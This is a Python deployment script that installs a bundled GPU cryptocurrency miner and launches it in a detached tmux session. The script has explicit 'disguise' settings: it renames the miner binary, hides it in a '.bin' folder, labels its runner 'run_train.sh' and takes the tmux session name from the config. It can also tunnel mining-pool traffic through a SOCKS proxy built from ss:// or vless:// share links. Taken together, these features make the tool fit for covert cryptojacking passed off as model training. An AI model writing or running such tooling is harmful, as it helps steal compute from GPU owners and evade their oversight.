#!/usr/bin/env python3
"""Install the bundled GPU miner and launch it in tmux.

Usage:
    python3 train_setup.py
    python3 train_setup.py --check
    python3 train_setup.py -c path.json
"""
import argparse
import json
import os
import shlex
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path
from urllib.parse import urlsplit

from proxy.assets.share_links import import_link
from utils import decrypt_config

PROJECT_DIR = Path(__file__).resolve().parent
DEFAULT_CONFIG = PROJECT_DIR / "config.json"
TRAINER_DIR = PROJECT_DIR / "src" / "trainer"
BUNDLED_BINARY_NAME = "pt_main"
PROXY_MANAGER = PROJECT_DIR / "proxy" / "assets" / "manage_connection.py"
DEFAULT_SOCKS = "socks5://127.0.0.1:10808"
PROXY_ENV_KEYS = ("all_proxy", "ALL_PROXY", "http_proxy", "https_proxy",
                  "HTTP_PROXY", "HTTPS_PROXY", "no_proxy", "NO_PROXY")


def load_config(argv):
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("-c", "--config", type=Path, default=DEFAULT_CONFIG)
    parser.add_argument("--check", action="store_true", help="validate without installing or launching")
    args = parser.parse_args(argv[1:])
    return decrypt_config(json.loads(args.config.read_text(encoding="utf-8"))), args.check


def resolve(cfg):
    """Resolve the local bundle relative to this script, independent of cwd."""
    miner = cfg["miner"]
    app_dir = Path.home() / cfg["disguise"]["app_dir_name"]
    return {
        "use_proxy": cfg.get("useProxy", False),
        "proxy_config": cfg.get("proxyConfig", ""),
        "socks": cfg.get("socks", DEFAULT_SOCKS),
        "pool_url": cfg["pool"]["url"],
        "wallet": cfg["wallet"]["address"],
        "worker": cfg["wallet"]["worker"],
        "source_dir": TRAINER_DIR,
        "algo": miner["algo"],
        "print_time": miner.get("print_time", 120),
        "temp_limit": miner.get("temp_limit", 78),
        "app_dir": app_dir,
        "bin_dir": app_dir / ".bin",
        "logs_dir": app_dir / "logs",
        "bin_name": cfg["disguise"]["binary_name"],
        "session": cfg["disguise"]["tmux_session"],
        "power_limit": cfg["gpu"].get("power_limit", 0),
    }


def local_proxy_port(socks):
    """The managed client binds an unauthenticated, unprivileged local port."""
    try:
        parsed = urlsplit(socks)
        port = parsed.port
        if (socks.startswith("socks5://") and parsed.hostname == "127.0.0.1"
                and port is not None and 1024 <= port <= 65535
                and parsed.username is None and parsed.password is None
                and not (parsed.path or parsed.query or parsed.fragment)
                and not any(char.isspace() for char in socks)):
            return port
    except (ValueError, TypeError, AttributeError):
        pass
    raise ValueError("socks must be socks5://127.0.0.1:PORT (port 1024-65535)")


def proxy_profile(link):
    if not isinstance(link, str) or not link.strip() or any(char.isspace() for char in link.strip()):
        raise ValueError("proxyConfig must contain one ss:// or vless:// share link when useProxy is true")
    try:
        return import_link(link.strip())[1]
    except ValueError as exc:
        raise ValueError(f"Invalid proxyConfig: {exc}") from exc


def validate(c):
    if type(c["use_proxy"]) is not bool:
        raise ValueError("useProxy must be a JSON boolean (true or false)")
    required = ("pool_url", "wallet", "worker", "algo", "bin_name", "session")
    if c["use_proxy"]:
        required += ("socks",)
    missing = [key for key in required if not isinstance(c[key], str) or not c[key].strip()]
    if missing:
        raise ValueError(f"Set nonempty config values for: {', '.join(missing)}")
    if any(c[key].startswith("YOUR_") for key in ("wallet", "pool_url", "algo")):
        raise ValueError("Set miner.algo, pool.url, and wallet.address before deploying.")
    if c["use_proxy"]:
        local_proxy_port(c["socks"])
        proxy_profile(c["proxy_config"])
        if not PROXY_MANAGER.is_file():
            raise ValueError(f"Bundled proxy manager missing: {PROXY_MANAGER}")
    if Path(c["bin_name"]).name != c["bin_name"] or c["bin_name"] in (".", ".."):
        raise ValueError("binary_name must be a filename, without directory components")
    if not (c["source_dir"] / BUNDLED_BINARY_NAME).is_file():
        raise ValueError(f"Bundled miner missing: {c['source_dir'] / BUNDLED_BINARY_NAME}")
    if c["bin_dir"].resolve().is_relative_to(c["source_dir"].resolve()):
        raise ValueError("Install directory must be outside src/trainer")


def sh(*cmd, check=True, **kw):
    return subprocess.run(cmd, check=check, text=True, **kw)


def tunnel_env(socks=None):
    """Apply the selected mode without inheriting a shell's proxy settings."""
    env = {key: value for key, value in os.environ.items() if key not in PROXY_ENV_KEYS}
    if socks is None:
        return env
    port = local_proxy_port(socks)
    remote_dns_socks = f"socks5h://127.0.0.1:{port}"
    http = f"http://127.0.0.1:{port}"
    return {
        **env,
        "all_proxy": remote_dns_socks, "ALL_PROXY": remote_dns_socks,
        "http_proxy": http, "https_proxy": http,
        "HTTP_PROXY": http, "HTTPS_PROXY": http,
        "no_proxy": "", "NO_PROXY": "",
    }


def prepare_proxy(c):
    """Validate, test, and activate this share link before installing the miner."""
    if not c["use_proxy"]:
        return
    profile = proxy_profile(c["proxy_config"])
    port = local_proxy_port(c["socks"])
    # Keep credentials out of process arguments and remove the input on failure
    # as well as success. The proxy manager keeps its own private runtime state.
    with tempfile.NamedTemporaryFile(mode="w", encoding="utf-8",
                                     prefix="miner-proxy-", suffix=".json") as stream:
        json.dump(profile, stream, ensure_ascii=False)
        stream.flush()
        sh(sys.executable, str(PROXY_MANAGER), "setup", "--links", stream.name,
           "--port", str(port), env=tunnel_env())


def install(c):
    """Copy the local bundle, including libraries and other runtime assets."""
    c["logs_dir"].mkdir(parents=True, exist_ok=True)
    shutil.copytree(c["source_dir"], c["bin_dir"], dirs_exist_ok=True)
    binary = c["bin_dir"] / BUNDLED_BINARY_NAME
    target = c["bin_dir"] / c["bin_name"]
    if binary != target:
        binary.replace(target)
    target.chmod(0o755)


def write_env_file(c):
    values = {
        "USE_PROXY": "true" if c["use_proxy"] else "false",
        "SOCKS": c["socks"] if c["use_proxy"] else "",
        "POOL": c["pool_url"], "WALLET": c["wallet"],
        "WORKER": c["worker"], "POWER_LIMIT": c["power_limit"],
    }
    path = c["app_dir"] / ".env"
    fd = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
    with os.fdopen(fd, "w") as stream:
        os.fchmod(stream.fileno(), 0o600)
        stream.write("".join(f"{key}={shlex.quote(str(value))}\n" for key, value in values.items()))


def write_runner(c):
    quote = lambda value: shlex.quote(str(value))
    runner = c["app_dir"] / "run_train.sh"
    lines = [
        "#!/usr/bin/env bash",
        "set -euo pipefail",
        f"source {quote(c['app_dir'] / '.env')}",
        f"cd {quote(c['bin_dir'])}",
        'export LD_LIBRARY_PATH="$PWD:$PWD/lib${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}"',
        # tmux can retain proxy variables from an earlier session. Apply the
        # config inside the runner too, including when it is invoked directly.
        "unset " + " ".join(PROXY_ENV_KEYS),
        "proxy_args=()",
        'if [[ "$USE_PROXY" == true ]]; then',
        '    proxy_args=(--proxy "$SOCKS")',
        '    export all_proxy="socks5h://${SOCKS#socks5://}" ALL_PROXY="socks5h://${SOCKS#socks5://}"',
        '    export http_proxy="http://${SOCKS#socks5://}" https_proxy="http://${SOCKS#socks5://}"',
        '    export HTTP_PROXY="$http_proxy" HTTPS_PROXY="$https_proxy"',
        '    export no_proxy="" NO_PROXY=""',
        'fi',
        "power_args=()",
        'if [[ "$POWER_LIMIT" != 0 ]]; then power_args=(--gpu-powerlimit "$POWER_LIMIT"); fi',
    ]
    command = [
        f"exec {quote(c['bin_dir'] / c['bin_name'])}",
        f"--algo {quote(c['algo'])}",
        '--url "$POOL"',
        '--user "$WALLET.$WORKER"',
        '"${proxy_args[@]}"',
        "--no-color",
        f"--print-time {quote(c['print_time'])}",
        f"--log-file {quote(c['logs_dir'] / 'session.log')}",
        f"--gpu-temp-limit {quote(c['temp_limit'])}",
        '"${power_args[@]}"',
        '"$@"',
    ]
    runner.write_text("\n".join(lines) + "\n" + " \\\n    ".join(command) + "\n")
    runner.chmod(0o755)


def launch(env, c):
    sh("tmux", "kill-session", "-t", c["session"], check=False, env=env)
    sh("tmux", "new-session", "-d", "-s", c["session"],
       shlex.quote(str(c["app_dir"] / "run_train.sh")), env=env)
    sh("tmux", "ls", env=env)


def main():
    try:
        cfg, check = load_config(sys.argv)
        c = resolve(cfg)
        validate(c)
        if check:
            print(f"Configuration valid. Local miner: {c['source_dir'] / BUNDLED_BINARY_NAME}")
            return
        if shutil.which("tmux") is None:
            raise ValueError("tmux not found; install it before launching.")
        prepare_proxy(c)
        install(c)
        write_env_file(c)
        write_runner(c)
        launch(tunnel_env(c["socks"] if c["use_proxy"] else None), c)
    except (OSError, ValueError, KeyError, TypeError, subprocess.CalledProcessError) as exc:
        sys.exit(f"Setup failed: {exc}")
    print(f"\nLog:    tail -f {shlex.quote(str(c['logs_dir'] / 'session.log'))}")
    print(f"Attach: tmux attach -t {shlex.quote(c['session'])}")
    print(f"Stop:   tmux kill-session -t {shlex.quote(c['session'])}")


if __name__ == "__main__":
    main()
